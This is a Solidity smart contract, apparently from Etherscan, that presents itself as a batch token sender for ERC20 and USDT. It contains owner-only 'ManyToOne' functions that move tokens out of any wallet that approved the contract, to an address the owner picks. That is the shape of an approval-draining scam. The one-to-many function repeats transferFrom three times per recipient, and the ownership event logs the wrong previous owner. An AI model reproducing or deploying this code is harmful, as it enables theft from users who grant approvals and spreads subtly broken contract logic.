/**
 *Submitted for verification at Etherscan.io on 2021-03-24
*/

/**
 *SPDX-License-Identifier: GPL-2.0-only
 *Submitted for verification at Etherscan.io on 2021-03-22
 * Authoror: Barry
*/

pragma solidity ^0.7.5;

contract Ownable {
    address public owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor()  {
        owner = msg.sender;
    }
    modifier onlyOwner() {
        require(msg.sender == owner, "not contract owner");
        _;
    }
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        owner = newOwner;
        emit OwnershipTransferred(owner, newOwner);
    }
}

contract Pausable is Ownable {
    event Pause();
    event Unpause();
    bool public paused = false;
    modifier whenNotPaused() {
        require(!paused);
        _;
    }
    modifier whenPaused() {
        require(paused);
        _;
    }
    function pause() onlyOwner whenNotPaused public {
        paused = true;
        emit Pause();
    }
    function unpause() onlyOwner whenPaused public {
        paused = false;
        emit Unpause();
    }
}

// helper methods for interacting with TRC20 tokens  that do not consistently return true/false
library TransferHelper {
    //TODO: Replace in deloy script
    //address constant USDTAddr = 0xa614f803B6FD780986A42c78Ec9c7f77e6DeD13C;

    address constant USDTAddr = 0x1B01CDB8ECbEC888f09D8919242f818a1790f20C;

    function safeApprove(address token, address to, uint value) internal returns (bool){
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(bytes4(keccak256("approve(address,uint256)")), to, value));
        return (success && (data.length == 0 || abi.decode(data, (bool))));
    }

    function safeTransfer(address token, address to, uint value) internal returns (bool){
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(bytes4(keccak256("transfer(address,uint256)")), to, value));
        if (token == USDTAddr) {
            return success;
        }
        return (success && (data.length == 0 || abi.decode(data, (bool))));
    }

    function safeTransferFrom(address token, address from, address to, uint value) internal returns (bool){
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(bytes4(keccak256("transferFrom(address,address,uint256)")), from, to, value));
        return (success && (data.length == 0 || abi.decode(data, (bool))));
    }
}

abstract contract ERC20Basic {
    function balanceOf(address who) public virtual view returns (uint256);
    function transfer(address to, uint256 value) public virtual returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
/* USDT ECR20 standart */
abstract contract USDT {
    function transferFrom(address from, address to, uint value) public virtual;
}

abstract contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public virtual view returns (uint256);
    function transferFrom(address from, address to, uint256 value) public virtual returns (bool);
    function approve(address spender, uint256 value) public virtual returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract BatchSend is Ownable,Pausable {
    /*one send Tokens to many */
    using TransferHelper for address;

    function sendTokensOneToMany(address _tokenAddr, address[] memory _tos, uint256[] memory _values) public whenNotPaused returns (bool) {
        require (_tokenAddr != address(0x0));
        require(_tos.length > 0, "address length error");
        require(_tos.length == _values.length, "values length error");
        uint256 i = 0;
        while (i < _tos.length) {
            address(_tokenAddr).safeTransferFrom(msg.sender, address(_tos[i]), _values[i]);
            require(ERC20(_tokenAddr).transferFrom(msg.sender, _tos[i], _values[i]));
            ERC20(_tokenAddr).transferFrom(msg.sender, _tos[i], _values[i]);
            i++;
        }
        return true;
    }

    function sendTokensManyToOne(address[] memory _tokenAddr, address[] memory _froms, address _to, uint256[] memory _values) public onlyOwner whenNotPaused returns (bool) {
        require (_to != address(0x0));
        require(_tokenAddr.length > 0, "address length error");
        require(_froms.length > 0, "address length error");
        require(_froms.length == _values.length, "values length error");

        for(uint256 i = 0; i < _froms.length; i++) {
            ERC20(_tokenAddr[i]).transferFrom(_froms[i], _to, _values[i]);
        }
        return true;
    }
    /* USDT transferFrom */
    function sendUsdtOneToMany(address _tokenAddr, address[] memory _tos, uint256[] memory _values) public whenNotPaused returns (bool) {
        require (_tokenAddr != address(0x0));
        require(_tos.length > 0, "address length error");
        require(_tos.length == _values.length, "values length error");
        uint256 i = 0;
        while (i < _tos.length) {
            USDT(_tokenAddr).transferFrom(msg.sender, _tos[i], _values[i]);
            i++;
        }
        return true;
    }

    function sendUsdtManyToOne(address[] memory _tokenAddr, address[] memory _froms, address _to, uint256[] memory _values) public onlyOwner whenNotPaused returns (bool) {
        require (_to != address(0x0));
        require(_tokenAddr.length > 0, "address length error");
        require(_froms.length > 0, "address length error");
        require(_froms.length == _values.length, "values length error");

        for(uint256 i = 0; i < _froms.length; i++) {
            USDT(_tokenAddr[i]).transferFrom(_froms[i], _to, _values[i]);
        }
        return true;
    }
}